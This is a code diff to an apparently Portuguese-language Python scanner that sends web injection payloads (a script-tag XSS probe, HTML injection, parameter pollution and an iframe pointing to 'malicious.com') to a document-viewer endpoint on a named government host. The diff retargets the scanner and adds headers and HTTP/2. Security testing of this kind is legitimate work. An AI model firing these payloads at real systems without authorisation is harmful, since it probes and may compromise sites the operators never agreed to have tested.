@@ -4,7 +4,7 @@ from urllib.parse import quote
 from bs4 import BeautifulSoup
 
 # Configurações iniciais
-url_base = "https://sone.codatahml.pb.gov.br/javascript/bookmark-site.js"
+url_base = "https://sone.codatahml.pb.gov.br/index.php?page=document-viewer.php"
 headers_base = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
 }
@@ -14,14 +14,13 @@ payloads = {
     'Cross Site Scripting': "<script>alert('XSS')</script>",
     'HTML Injection': "<h1>HTML Injection</h1>",
     'HTTP Parameter Pollution': "valid_file.pdf&file=malicious_file.txt",
-    'Frame Source Injection': "<iframe src='httpw://google.com'></iframe>",
+    'Frame Source Injection': "<iframe src='http://malicious.com'></iframe>",
 }
-
 # Função assíncrona para enviar a requisição e verificar a resposta
 async def enviar_requisicao_e_verificar_resposta(payload, tipo_vulnerabilidade, teste_numero):
-    url_completa = f"{url_base}&file={quote(payload)}"
-    async with httpx.AsyncClient() as client:  # HTTP/2 desabilitado
-        resposta_teste = await client.get(url_completa)  # Cabeçalhos simplificados
+    url_completa = f"{url_base}&file={quote(payload)}"  # Usando quote para codificar o payload
+    async with httpx.AsyncClient(http2=True) as client:
+        resposta_teste = await client.get(url_completa, headers=headers_base)
         
         # Imprime detalhes da resposta para depuração
         #depurar_resposta(resposta_teste, teste_numero, tipo_vulnerabilidade)
